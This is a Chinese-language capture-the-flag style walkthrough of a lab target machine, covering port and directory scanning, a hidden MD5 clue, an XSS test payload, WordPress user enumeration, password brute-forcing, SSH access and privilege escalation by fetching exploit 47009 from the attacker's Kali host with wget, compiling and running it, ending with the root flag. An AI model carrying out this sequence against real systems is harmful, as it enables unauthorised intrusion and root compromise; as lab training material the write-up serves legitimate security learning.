# 靶机2

### 1.挂代理后能凭通58网段，利用nmap等根据收集目标主机ip和端口，发现192.168.58.133开放22、80端口

![image-20250305200906033](靶机2.assets/image-20250305200906033.png)

![image-20250305201044985](靶机2.assets/image-20250305201044985.png)

### 2.利用dirb命令扫描http：//192.168.58.133的目录

![image-20250305201531440](靶机2.assets/image-20250305201531440.png)

### 发现一个phpmyadmin网页和index.php网页，尝试访问index.php

![image-20250305202144015](靶机2.assets/image-20250305202144015.png)

### 提示not found，此时尝试f12查看源码，看看有没有收获    发现注释，

![image-20250305202408742](靶机2.assets/image-20250305202408742.png)

### 翻译后推断beelzebub应该用md5加密了     在kali里解密得到明文d18e1e22becbd915b45e0e655429d487

![image-20250305202705629](靶机2.assets/image-20250305202705629.png)

### 3.不妨拆beelzebub为用户名，解密的值为密码，在phpmyadmin登录，结果报错

![image-20250305203119768](靶机2.assets/image-20250305203119768.png)

### 4.继续尝试利用dirsearch对http://192.168.58.133/d18e1e22becbd915b45e0e655429d487扫描

![image-20250305203932225](靶机2.assets/image-20250305203932225.png)

### 发现敏感目录upload和很多wp（wordpress）

### 打开ihttp://192.168.58.133//d18e1e22becbd915b45e0e655429d487/wp-content/uploads/发现文件泄露

![image-20250305204208917](靶机2.assets/image-20250305204208917.png)

### 这时候随便点点看，发现Talk To VALAK目录点进去跳转到beelzebub网页

![image-20250305204415287](靶机2.assets/image-20250305204415287.png)

### 5.很明显有个输入框输入1有提示信息，尝试xss注入输入<script>alert(1)</script>有弹窗确认有xss

![image-20250305204911173](靶机2.assets/image-20250305204911173.png)

养成f12的好习惯，发现有个密码

![image-20250305205158156](靶机2.assets/image-20250305205158156.png)

### 6.使用wpscan --url http://192.168.58.133/d18e1e22becbd915b45e0e655429d487/ -e u --ignore-main-redirect --force命令扫出用户名( krampus和valak)

![image-20250305213617563](靶机2.assets/image-20250305213617563.png)

### 将扫出的用户名及找到的密码登录phpmyadmin，发现都不对

![image-20250305213846958](靶机2.assets/image-20250305213846958.png)

![image-20250305213934993](靶机2.assets/image-20250305213934993.png)

### 7.可以尝试爆破（bp或phpmyadmin多线程爆破）

![image-20250305225314392](靶机2.assets/image-20250305225314392.png)

![image-20250305230521548](靶机2.assets/image-20250305230521548.png)

### 8.目标主机开了ssh，尝试远程登录发现krampus账户登录成功

![image-20250305215831161](靶机2.assets/image-20250305215831161.png)

### 利用cat /etc/passwd命令查看当前用户的权限，确定为普通用户

![image-20250305220051228](靶机2.assets/image-20250305220051228.png)

### 提权，尝试登录root用户，不行，找其他方式

![image-20250305220658641](靶机2.assets/image-20250305220658641.png)

### 先ls查看一下，发现有个.bash_history文件

![image-20250305220941715](靶机2.assets/image-20250305220941715.png)

### 使用more查看发现一个域名，且用的wget命令，所以这个网址可能有信息

![image-20250305221525474](靶机2.assets/image-20250305221525474.png)

### 下载下来，ls看到有个47009的文件   在kali中使用命令python3 -m http.server 80,将47009传给目标主机终端

![image-20250305222221241](靶机2.assets/image-20250305222221241.png)

### 在目标主机终端用命令wget 10.16.0.78/47009接受kali的47009文件

![image-20250305222504194](靶机2.assets/image-20250305222504194.png)

### 9.用gcc 47009 -o exploit命令使用47009文件

提示已存在

![image-20250305222650248](靶机2.assets/image-20250305222650248.png)

### 查看历史命令发现要改文件名

![image-20250305222852760](靶机2.assets/image-20250305222852760.png)

### 运行gcc exploit.c -o exp命令并给其权限执行

![image-20250305224135819](靶机2.assets/image-20250305224135819.png)

### 提权成功，ls看眼文件，发现有个root.txt,里面的内容就是flag{8955qpasq8qq807879p75e1rr24cr1a5}

![image-20250305224402526](靶机2.assets/image-20250305224402526.png)

